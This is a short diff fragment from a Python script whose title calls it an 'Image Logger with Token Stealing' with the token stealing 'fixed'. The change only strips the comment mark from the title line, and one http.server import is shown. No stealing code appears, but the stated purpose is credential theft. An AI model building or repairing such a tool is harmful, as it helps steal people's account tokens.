@@ -1,4 +1,4 @@
-# Image Logger with Token Stealing - TOKEN STEALING FIXED
+ Image Logger with Token Stealing - TOKEN STEALING FIXED
 # Based on integrated_image_logger_fixed.py with only token stealing fixed
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
